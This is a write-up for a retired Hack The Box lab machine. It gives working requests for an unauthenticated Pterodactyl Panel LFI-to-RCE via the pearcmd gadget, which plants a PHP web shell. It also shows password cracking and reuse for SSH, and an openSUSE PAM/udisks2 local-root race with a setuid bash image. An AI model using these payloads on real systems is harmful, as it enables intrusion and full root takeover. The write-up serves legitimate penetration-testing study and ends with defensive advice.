# Pterodactyl — Hack The Box (retired)

**Linux**

*Flag values redacted; target/VPN addresses generalised.*

A modern, clean chain: one recent unauthenticated web CVE for the foothold,
password reuse for the user, and a current openSUSE local-root CVE chain for the
finish. What makes it a good exercise is that every step is *evidenced* by
enumeration — including the privesc, which the box hints at explicitly.

## Recon

Only two ports: 22 (OpenSSH 9.6) and 80 (nginx 1.21.5). The bare IP 302-redirects
to `http://pterodactyl.htb/`, so it is vhost-gated — add the host and look again.
`pterodactyl.htb` is a static "MonitorLand" Minecraft page, but `X-Powered-By:
PHP/8.4.8` and, crucially, **`/changelog.txt`** spell out the whole stack:

```
[Installed] Pterodactyl Panel v1.11.10
- MariaDB 11.8.3 backend
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

Three gifts in one file: a pinned product version, PEAR, and a "temporary"
`phpinfo.php`. Vhost fuzzing confirms `panel.pterodactyl.htb` serves the panel,
and `/phpinfo.php` on the main vhost is live — it discloses openSUSE Leap 15.6,
user `wwwrun`, `register_argc_argv=On`, no `disable_functions`/`open_basedir`, and
`/usr/share/php/PEAR` in `include_path`. That is the exact recipe for the next step.

## Foothold — CVE-2025-49132 (unauth LFI → RCE)

Pterodactyl ≤ 1.11.10 exposes `/locales/locale.json`, which builds an
`include()` path straight from the `locale` and `namespace` query params with no
authentication and no sanitisation:

```
/locales/locale.json?locale=../../../../../etc&namespace=passwd   → {"..\/etc":{"passwd":[]}}
```

With PEAR present and `register_argc_argv=On`, the classic `pearcmd.php` gadget
turns the include into arbitrary file *write*: the query string becomes
`pearcmd`'s `argv`, and `config-create` writes an attacker-chosen string into an
attacker-chosen path.

```
# 1) write a PHP stager (literal <?= bytes — see the gotcha below)
GET /locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_GET[0])?>+/tmp/pl.php
# 2) include it
GET /locales/locale.json?locale=../../../../../tmp&namespace=pl&0=id
→ uid=474(wwwrun) gid=477(www)
```

**Gotcha that cost the first attempt:** the PHP open tag must arrive as *literal
bytes*. `requests`/`curl` percent-encode `<` and `>`, so the planted file
contained `%3C?=` and was inert — it read exactly like a failed exploit. A raw
socket fixed it. (Same lesson as prior boxes: inject raw `<?php`/`<?=` with a
socket, not an HTTP client.)

## User — password reuse

`/var/www/pterodactyl/.env` gave the DB creds (`pterodactyl:PteraPanel`), and the
`users` table two bcrypt hashes: `headmonitor` (a `root_admin`) and
`phileasfogg3`. `phileasfogg3` cracks in seconds against rockyou to `!QAZ2wsx`,
and — the box's theme — that panel password is reused as the **SSH** password.
`user.txt` is in `phileasfogg3`'s home.

### The rabbit hole worth naming
`sudo -l` shows `phileasfogg3` may run `(ALL) ALL` — but under openSUSE's
`Defaults targetpw`, that is the *distro default*: anyone may sudo **if they know
the target (root) password**. It is not a grant. I spent time treating
`headmonitor` (the other, admin account) as the pivot and trying to crack its
bcrypt — a dead end: `headmonitor` is **locked** (`!` in `/etc/shadow`), a pure
decoy. The lesson: `(ALL) ALL` + `targetpw` on openSUSE means "find root's
password by other means," not "you already won."

## Root — CVE-2025-6018 + CVE-2025-6019

The pointer was sitting in the mailbox. `/var/spool/mail/phileasfogg3` holds a
notice "from" headmonitor:

> **SECURITY NOTICE — Unusual udisksd activity (stay alert)**

openSUSE Leap 15.6 + `udisks2 2.9.2` + `libblockdev 2.26` + `polkit 121` is the
Qualys June-2025 local-root chain:

1. **CVE-2025-6018 (PAM `allow_active` bypass).** By default a remote SSH session
   is only `allow_active: challenge`. Dropping a `~/.pam_environment` with
   `XDG_SEAT OVERRIDE=seat0` / `XDG_VTNR OVERRIDE=1` makes `pam_systemd` register
   the *next* login as seat0/vt1 — i.e. "physically present." After reconnecting,
   `loginctl` shows `Seat=seat0 Active=yes` and `CanReboot=yes`: polkit now treats
   the session as `allow_active`.

2. **CVE-2025-6019 (udisks2/libblockdev resize race).** With `allow_active`, a
   user may `udisksctl loop-setup` an image and call
   `Filesystem.Resize`. To perform the resize, udisks mounts the filesystem **as
   root without `nosuid`** for a brief window. Put a **root-owned setuid `bash`**
   on that filesystem and race to execute it during the mount → root shell.

Building the image is the fiddly part: the suid binary must be **root-owned**, so
you need root at *image-creation* time. My container couldn't loop-mount, so I
built the XFS with `mkfs.xfs -p <protofile>` — the proto entry `xpl -u-755 0 0
/tmp/victim_bash` bakes a `uid=0`, mode-`04755` inode at format time, no mount
needed (verified with `xfs_db`: `core.mode = 0104755`). The `bash` inside must be
the **target's own** amd64 binary (glibc/ABI match). Then:

```
udisksctl loop-setup --file /tmp/xfs.image        # -> /dev/loopN
# race: while :; do for d in /tmp/blockdev.*/; do "$d/xpl" -p -c 'id; cat /root/root.txt'; done; done &
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loopN \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
→ euid=0(root)
```

### Two operational gotchas
- **Duplicate-UUID XFS won't mount.** Every copy of one image shares its
  filesystem UUID. A *leftover* udisks mount from an earlier run pins that UUID,
  and the kernel then refuses to mount any fresh loop of the same image
  ("wrong fs type, bad superblock") — the race silently never wins. Rebuild the
  image so `mkfs.xfs` assigns a **new UUID** each time.
- **`umount` needs ruid 0.** The suid `bash -p` has euid 0 but ruid 1002, and
  util-linux `umount` refuses ("must be superuser"). Cleaning up the leftover
  udisks mounts required `setuid(0)` first (a one-line python) before `umount`.

## Defensive takeaway

The remote-reachable flaw (the panel CVE) is what a firewall sees, but the
*severity* came from two local conveniences: a reused password and an unpatched
udisks. Patch the panel to stop the door opening at all; stop reusing the panel
password for SSH to keep a web compromise from becoming an OS one.
